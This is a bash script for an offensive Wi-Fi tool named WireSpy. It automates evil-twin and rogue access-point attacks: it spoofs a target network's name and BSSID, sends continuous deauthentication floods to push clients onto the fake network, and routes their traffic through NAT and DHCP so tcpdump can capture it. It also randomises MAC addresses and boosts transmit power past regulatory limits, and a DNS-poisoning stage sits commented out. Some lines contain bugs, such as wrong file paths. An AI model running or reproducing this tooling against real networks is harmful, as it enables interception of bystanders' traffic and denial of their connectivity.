#!/usr/bin/env bash
#
#    Copyright (C) 2015 - 2018 Alexandre Teyar
#
# Licensed under the Apache License, SCRIPT_VERSION 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
# http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
#    limitations under the License.

# Improvement select interface using cursors rather than typing it

declare -gr SCRIPT_VERSION=0.4

declare -gr BRANCH='dev'

BOLD='\e[1m'
DIM='\e[2m'
RESET_ALL='\e[0m'
RESET_BOLD='\e[21m'
RESET_FG='\e[39m'
UNDERLINED='\e[4m'

FG_BLACK='\e[30m'
FG_CYAN='\e[36m'
FG_GREEN='\e[32m'
FG_YELLOW='\e[33m'
FG_WHITE='\e[97m'

BG_BLUE='\e[44m'
BG_CYAN='\e[46m'
BG_DARKGREY='\e[100m'
BG_GREEN='\e[42m'
BG_RED='\e[41m'
BG_YELLOW='\e[43m'

declare -gr PROMPT="${BG_GREEN}${FG_WHITE}${BOLD}wirespy$RESET_ALL »"
declare -gr PROMPT_EVILTWIN="${BG_GREEN}${FG_WHITE}${BOLD}wirespy${FG_BLACK} > eviltwin$RESET_ALL »"
declare -gr PROMPT_HONEYPOT="${BG_GREEN}${FG_WHITE}${BOLD}wirespy${FG_BLACK} > honeypot$RESET_ALL »"
declare -gr PROMPT_POWERUP="${BG_GREEN}${FG_WHITE}${BOLD}wirespy${FG_BLACK} > powerup$RESET_ALL »"

isAP=false
isDHCP=false
# isDNS=false
isSniffing=false

declare -i attack_type=0

INTF=''
MINTF=''
TINTF=''
WCHAN=''
WINTF=''

declare -gr AIRBASE_ERROR='An error occurred with airbase-ng, no tap interface was created'
declare -gr AP_PREREQUISITE='To use this option, first configure an access-point'
declare -gr EVILTWIN='This attack consists of creating an evil copy of an access point and repeatedly sending deauth packets to its clients to force them to connect to our evil copy.
Consequently, choose the same ESSID and wireless channel as the targeted access point.
To properly perform this attack the attacker should first scan all the in-range access points to select a target. Next step is to copy the BSSID, ESSID and channel of the 
selected target access point, to create its twin. 
The final step is to deauthenticate all the clients from the target access point, so that the victims may connect to the evil twin.'
declare -gr HONEYPOT='The Blackhole access point type will respond to all probe requests (the access point may receive a lot of requests in areas with high levels of WiFi activity such as crowded public places).
The Bullzeye access point type will respond only to the probe requests specifying the access point ESSID.

    1) Blackhole
    2) Bullzeye'

declare -a required_packages=(
    'aircrack-ng'
    'git'
    'grep'
    'macchanger'
    'procps'
    'iproute2'
    'iw'
    'tcpdump'
    'xterm'
)

trap quit INT

print_question() { echo -e "${BG_GREEN}${FG_WHITE}${BOLD}wirespy$RESET_ALL » $1"; }
print_error()    { echo -e "${BG_GREEN}${FG_WHITE}${BOLD}wirespy${FG_BLACK} > error$RESET_ALL » $1"; }
print_info()     { echo -e "${BG_GREEN}${FG_WHITE}${BOLD}wirespy${FG_BLACK} > info$RESET_ALL » $1"; }
print_intf()     { echo -e "${BG_GREEN}${FG_WHITE}${BOLD}wirespy${FG_BLACK} > interface$RESET_ALL » $1"; }
print_warning()  { echo -e "${BG_GREEN}${FG_WHITE}${BOLD}wirespy${FG_BLACK} > warning$RESET_ALL » $1"; }


function banner() {
    echo -e "${BOLD}WireSpy v$SCRIPT_VERSION${RESET_ALL} (type '${BOLD}help${RESET_ALL}' for a list of commands)"
    echo -e "${UNDERLINED}${DIM}Author: Alexandre Teyar | LinkedIn: linkedin.com/in/alexandre-teyar | GitHub: github.com/AresS31\n$RESET_ALL"
}


function self_update() {
    print_info 'Checking for an update...'

    if [[ $(git rev-parse --is-inside-work-tree 2> /dev/null) ]]; then
        git fetch

        if [[ $(git diff --name-only origin/$BRANCH -- ${0}) ]]; then
            print_info 'New version available, updating...'
            git checkout $0
            git pull origin $BRANCH --force

            print_info "$0 has successfully been updated"
            exit 0
        else
            print_info 'This is the latest stable version'
        fi
    else
        print_warning "It is recommended to get $0 on GitHub using the command: git clone https://github.com/AresS31/wirespy"
    fi
}


function check_compatibility() {
    print_info 'Checking for dependencies...'

    for package in "${required_packages[@]}"; do
        if [[ $(dpkg -s $package 2> /dev/null) ]]; then
            continue
        else
            print_error "The $package package is missing, install it using the command: sudo apt-get install $package"
            exit 1
        fi
    done

    print_info 'All the required packages are already installed'
}


function help {
    echo -e """
${FG_GREEN}help$RESET_FG            : list available commands
${FG_GREEN}clear$RESET_FG           : clear the screen
${FG_GREEN}exit$RESET_FG            : exit the script
${FG_GREEN}launch honeypot$RESET_FG : launch a rogue access point
${FG_GREEN}launch eviltwin$RESET_FG : launch an evil-twin attack
${FG_GREEN}show DHCP$RESET_FG       : display the DHCP leases log
${FG_GREEN}hide DHCP$RESET_FG       : hide the DHCP leases log
${FG_GREEN}start sniff$RESET_FG     : start packet capture
${FG_GREEN}stop sniff$RESET_FG      : stop packet capture
${FG_GREEN}powerup$RESET_FG         : powerup wireless interface
"""
}


function menu() {
    while :; do
        read -p "$(echo -e $PROMPT) " choice

        case $choice in
            'clear')
                reset
                ;;
            'exit')
                quit
                ;;
            'help')
                help
                ;;
            'hide DHCP')
                if [[ $isAP = false ]]; then
                    print_warning "$AP_PREREQUISITE"
                else
                    if [[ $isDHCP = true ]]; then
                        hide_DHCP
                    else
                        print_warning 'The DHCP leases log is not displayed and can therefore not be hidden'
                    fi
                fi
                ;;
            'launch eviltwin')
                clean_up > /dev/null
                PROMPT=$PROMPT_EVILTWIN
                configure_intfs
                menu_eviltwin
                configure_eviltwin
                isAP=true
                ;;
            'launch honeypot')
                clean_up > /dev/null
                PROMPT=$PROMPT_HONEYPOT
                configure_intfs
                menu_honeypot
                configure_honeypot
                isAP=true
                ;;
            'powerup')
                PROMPT=$PROMPT_POWERUP
                intf_boost
                ;;
            'show DHCP')
                if [[ $isAP = false ]]; then
                    print_warning "$AP_PREREQUISITE"
                else
                    if [[ $isDHCP = false ]]; then
                        show_DHCP
                    else
                        print_warning 'The DHCP leases log is already being displayed'
                    fi
                fi
                ;;
            'start sniff')
                if [[ $isAP = false ]]; then
                    print_warning "$AP_PREREQUISITE"
                else
                    if [[ $isSniffing = false ]]; then
                        start_network_capture
                    else
                        print_warning 'The traffic is already being captured'
                    fi
                fi
                ;;
            'stop sniff')
                if [[ $isAP = false ]]; then
                    print_warning "$AP_PREREQUISITE"
                else
                    if [[ $isSniffing = true ]]; then
                        stop_network_capture
                    else
                        print_warning 'The traffic is already not being captured'
                    fi
                fi
                ;;
            # To be developped at some point
            # elif [[ $choice = 5 ]]; then
            #     if [[ $isAP = false ]]; then
            #         print_warning "$AP_PREREQUISITE"
            #     else
            #         if [[ $isDNS = false ]]; then
            #             start_DNS_poisonning
            #         else
            #             stop_DNS_poisonning
            #         fi
            #     fi
            *)
                print_warning "Unknown or invalid syntax $choice, type help for the help menu"
                ;;
        esac
    done
}


function configure_intfs() {
    local pass=false
    local -i res=1

    print_question 'Select the internet-facing interface:'

    display_intf

    while [[ $res != 0 ]]; do
        read -p "$(echo -e $PROMPT) " INTF
        check_intf "$INTF"
        res=$?
    done
    res=1

    print_question "Do you wish to randomise $INTF MAC address (this can cause problems)? Answer with y (yes) or n (no)"

    while [[ $pass = false ]]; do
        read -p "$(echo -e $PROMPT) " choice

        if [[ $choice = "y" ]]; then
            print_info "Randomising $INTF MAC address..."
            ip link set "$INTF" down && macchanger -A "$INTF" && ip link set "$INTF" up
            print_warning 'In case of problems, RESTART networking (/etc/init.d/network restart), or use wicd (wicd-client)'
            pass=true
        elif [[ $choice = "n" ]]; then
            pass=true
        else
            print_warning "Invalid answer: $choice"
        fi
    done
    pass=false

    print_question 'Select the wireless interface to use:'

    # prevent wlan adapter soft blocking
    rfkill unblock wifi
    display_wintf

    while [[ $res != 0 ]]; do
        read -p "$(echo -e $PROMPT) " WINTF
        check_intf "$WINTF"
        res=$?

        if [[ $WINTF = "$INTF" ]]; then
            print_warning "$INTF is already in use, select another interface"
            res=1
        fi
    done
    res=1

    # put the wireless interface into "monitor" mode
    print_info "Starting monitor mode on $WINTF..."
    ip link set "$WINTF" down && iw dev "$WINTF" set type monitor && ip link set "$WINTF" up
    MINTF=$WINTF
    # crucial to let WINTF come up before macchanging
    sleep 2

    check_intf "$MINTF"
    res=$?

    if [[ $res != 0 ]]; then
        print_error "$WINTF could not enter monitor mode"
        exit 1
    fi

    print_question "Do you wish to randomise $MINTF MAC address (recommended)? Answer with y (yes) or n (no)"

    while [[ $pass = false ]]; do
        read -p "$(echo -e $PROMPT) " choice

        if [[ $choice = "y" ]]; then
            "Randomising $MINTF MAC address..."
            ip link set "$MINTF" down && macchanger -A "$MINTF" && ip link set "$MINTF" up
            pass=true
        elif [[ $choice = "n" ]]; then
            pass=true
        else
            print_warning "Invalid answer: $choice"
        fi
    done
}


function menu_honeypot() {
    echo "$HONEYPOT"

    local pass=false

    while [[ $pass = false ]]; do
        read -p "$(echo -e $PROMPT) " choice

        case $attack_type in
            [1-2])
                pass=true
                ;;
            *) 
                print_warning "Invalid option: $attack_type"
                pass=false
                ;;
        esac
    done
}


function menu_eviltwin() {
    echo "$EVILTWIN"
}


function configure_honeypot() {
    local pass=false
    local -i res=1

    print_question 'Access point ESSID?'
    read -p "$(echo -e $PROMPT) " ESSID

    while [[ $pass = false ]]; do
        print_question 'Enter the wireless channel to use (value must be between 1 and 12):'
        read -p "$(echo -e $PROMPT) " WCHAN

        case $WCHAN in 
            [1-9]|1[0-2])
                pass=true
                ;;
            *) 
                print_warning "$WCHAN is not a valid wireless channel"
                pass=false
                ;;
        esac
    done
    pass=false

    while [[ $pass = false ]]; do
        print_question 'Configure WEP authentication for the access-point? Answer with y (yes) or n (no)'
        read -p "$(echo -e $PROMPT) " choice

        if [[ $attack_type = 1 ]]; then
            if [[ $choice = "y" ]]; then
                print_question 'Enter a WEP password (value must be 10 hexadecimal characters):'
                read -p "$(echo -e $PROMPT) " WEP 
                
                xterm -fg green -title "Blackhole - $ESSID" -e "airbase-ng -w $WEP -c $WCHAN -e $ESSID -P $MINTF | tee ./conf/tmp.txt 2> /dev/null" &
                pass=true
            elif [[ $choice = "n" ]]; then
                xterm -fg green -title "Blackhole - $ESSID" -e "airbase-ng -c $WCHAN -e $ESSID -P $MINTF | tee ./conf/tmp.txt 2> /dev/null" &
                pass=true
            else
                print_warning "Invalid answer: $choice"
                pass=false
            fi

        elif [[ $attack_type = 2 ]]; then
            if [[ $choice = "y" ]]; then
                print_question 'Enter a WEP password (value must be 10 hexadecimal characters):'
                read -p "$(echo -e $PROMPT) " WEP 

                xterm -fg green -title "Bullzeye - $ESSID" -e "airbase-ng -w $WEP -c $WCHAN -e $ESSID $MINTF | tee ./conf/tmp.txt 2> /dev/null" &
                pass=true
            elif [[ $choice = "n" ]]; then
                xterm -fg green -title "Bullzeye - $ESSID" -e "airbase-ng -c $WCHAN -e $ESSID $MINTF | tee ./conf/tmp.txt 2> /dev/null" &
                pass=true
            else
                print_warning "Invalid answer: $choice"
                pass=false
            fi
        fi
    done

    # crucial, to let TINTF come up before setting it up
    sleep 2                  
    # storing the terminal pid
    xterm_AP_PID=$(pgrep --newest Eterm)

    # extracting the tap interface
    TINTF=$(grep 'Created tap interface' ./conf/tmp.txt | awk '{print $5}')

    check_intf "$TINTF"
    res=$?

    if [[ $res != 0 ]]; then
        print_error "$AIRBASE_ERROR"
        sleep 4
        quit
    fi

    set_up_iptables
    set_up_DHCP_srv
    
    print_info "$ESSID is now running..."
    sleep 6
}


function configure_eviltwin() {
    local pass=false
    local -i res=1

    print_question 'ESSID for the evil-twin?'
    read -p "$(echo -e $PROMPT) " eviltwin_ESSID

    print_question 'BSSID for the evil-twin?'
    read -p "$(echo -e $PROMPT) " eviltwin_BSSID

    while [[ $pass = false ]]; do
        print_question "Enter the wireless channel to use (value must be identical to the legitimate access-point to spoof):"
        read -p "$(echo -e $PROMPT) " WCHAN

        case $WCHAN in
            [1-9]|1[0-2])
                pass=true
                ;;
            *) 
                print_warning "Invalid wireless channel: $WCHAN"
                pass=false
                ;;
        esac
    done

    echo "$MINTF"
    xterm -fg green -title "Evil-twin - $eviltwin_ESSID" -e "airbase-ng -c $WCHAN -e $eviltwin_ESSID -P $MINTF | tee ./conf/tmp.txt 2> /dev/null" &

    sleep 4                                 # crucial to let TINTF come up before setting it up
    xterm_AP_PID=$(pgrep --newest Eterm)    # storing the terminal pid 

    # extracting the tap interface
    TINTF=$(grep 'Created tap interface' /conf/tmp.txt | awk '{print $5}')

    check_intf "$TINTF"
    res=$?

    if [[ $res != 0 ]]; then
        print_error "$AIRBASE_ERROR"
        quit
    fi

    # de-auth the legit connected users
    xterm -fg green -title "aireplay-ng - $eviltwin_ESSID" -e "aireplay-ng --ignore-negative-one --deauth 0 -a $eviltwin_BSSID $MINTF" &
    xterm_aireplay_deauth=$(pgrep --newest xterm)

    set_up_iptables
    set_up_DHCP_srv
    
    print_info "$eviltwin_ESSID is now running..."
    sleep 6
}


function set_up_iptables() {
    # cleaning the mess
    iptables --flush
    iptables --table nat --flush
    iptables --delete-chain
    iptables --table nat --delete-chain

    # iptables rules
    iptables -P FORWARD ACCEPT
    # forward the traffic via the internet facing interface
    iptables -t nat -A POSTROUTING -o "$INTF" -j MASQUERADE
}


function set_up_DHCP_srv() {
    # enable ip forwarding
    echo "1" > /proc/sys/net/ipv4/ip_forward

    # setting up ip, route and stuff
    ip link set "$TINTF" up    
    # a bit of clean-up is always good!
    ip addr flush dev "$TINTF"
    ip addr add 10.0.0.254/24 dev "$TINTF"
    
    # a bit of clean-up is always good!
    ip route flush dev "$TINTF"
    ip route add 10.0.0.0/24 via 10.0.0.254 dev "$TINTF"

    # RESET_ALL any pre-existing dhcp leases
    cat /dev/null > /var/lib/dhcp/dhcpd.leases
    cat /dev/null > /tmp.txt/dhcpd.conf

    # Copy the conf file for the DHCP serv and change the isc-dhcp-server settings
    cp ./conf/dhcpd.conf /etc/dhcp/dhcpd.conf 
    sed -e s/INTERFACES=.*/INTERFACES=\"$TINTF\"/ -i.bak /etc/default/isc-dhcp-server

    # Starting the DHCP service
    dhcpd -cf /etc/dhcp/dhcpd.conf "$TINTF" &> /dev/null
    /etc/init.d/isc-dhcp-server restart &> /dev/null
}


function display_intf() {
    intfs=$(ip -o link show | awk -F': ' '{print $2}' | grep -v 'lo')

    if [[ $intfs ]]; then
        for intf in $intfs; do # get the network interfaces names
            IP=$(ip -o -f inet add show "$intf" | awk '{print $4}')
            MAC=$(ip link show "$intf" | awk '/ether/ {print $2}')
            print_intf "${intf}: $IP $MAC"
        done
    else
        print_error 'No networking interface detected'
        exit 1
    fi
}


# use the iw utility instead of the ip utility
function display_wintf() {
    wintfs=$(ip -o link show | awk -F': ' '{print $2}' | grep "wlan")

    if [[ $wintfs ]]; then
        for wintf in $wintfs; do # get the interfaces names
            IP=$(ip -o -f inet add show "$wintf" | awk '{print $4}')
            MAC=$(ip link show "$wintf" | awk '/ether/ {print $2}')
            print_intf "${intf}: $IP $MAC"
        done
    else
        print_error 'No wireless interface detected'
        exit 1
    fi
}


function check_intf() {
    if [[ $(ip link show "$1" 2> /dev/null) ]]; then
        return 0
    else
        print_warning "Invalid interface: $1"
        return 1
    fi
}  


function start_network_capture() {
    xterm -fg green -title "TCPDump" -e "tcpdump -i $TINTF -w ./logs/capture_$(/bin/date +"%Y%m%d-%H%M%S").pcap -v" &
    isSniffing=true
}


function stop_network_capture() {
    pkill tcpdump
    isSniffing=false
}


# function start_DNS_poisonning() {
#     xterm -fg green -title "DNSChef" -e "dnschef -i $TINTF -f ./conf/hosts" &
#     xterm_sniff_PID=$(pgrep --newest xterm)
#     isDNS=true
# }


# function stop_DNS_poisonning() {
#     pkill dnsspoof
#     isDNS=false
# }


function show_DHCP() {
    xterm -fg green -title "DHCP server" -e "tail -f /var/lib/dhcp/dhcpd.leases 2> /dev/null" &
    xterm_DHCP_PID=$(pgrep --newest xterm)
    isDHCP=true
}


function hide_DHCP() {
    pkill "$xterm_DHCP_PID" &> /dev/null
    isDHCP=false
}


function intf_boost() {
    local -i res=1

    print_question 'Select the wireless interface to boost-up:'

    display_wintf

    while [[ $res != 0 ]]; do
        read -p "$(echo -e $PROMPT) " super_WINTF
        check_intf "$super_WINTF"
        res=$?
    done

    ip link set "$super_WINTF" down && iw reg set BO && ip link set "$super_WINTF up" 

    print_question "Enter the power boost (up to 30dBm) to apply to ${super_WINTF}:"
    read -p "$(echo -e $PROMPT) " boost

    print_info "$super_WINTF powering up..."
    iw dev "$super_WINTF" set txpower fixed "$boost"mBm
    sleep 4
}


function clean_up() {
    local pass=false
    local -i res=1

    print_info "Terminating active processes..."
    if [[ $isDHCP = true ]]; then
        hide_DHCP
    # elif [[ $isDNS = true ]]; then
    #     stop_DNS_poisonning
    elif [[ $isSniffing = true ]]; then
        stop_network_capture
    fi

    killall airbase-ng airplay-ng &> /dev/null
    /etc/init.d/isc-dhcp-server stop &> /dev/null
    
    print_info "Deleting temporary files..."
    rm -f ./conf/tmp.txt

    check_intf "$MINTF" &> /dev/null
    res=$?

    if [[ $res = 0 ]]; then
        print_info "Starting managed mode on $MINTF" 
        ip link set "$MINTF" down && iw dev "$MINTF" set type managed && ip link set "$MINTF up"
        sleep 2
    fi
    pass=false
}


function quit() {
    clean_up
    exit
}


# ensure that the script is running with root privileges
# this step is necessary since WireSpy needs to be perform network changes
if [[ $EUID -ne 0 ]]; then
    print_error "You must run this script as as root using the command: sudo bash ${0}"
    exit 1
fi


banner
self_update
check_compatibility
menu
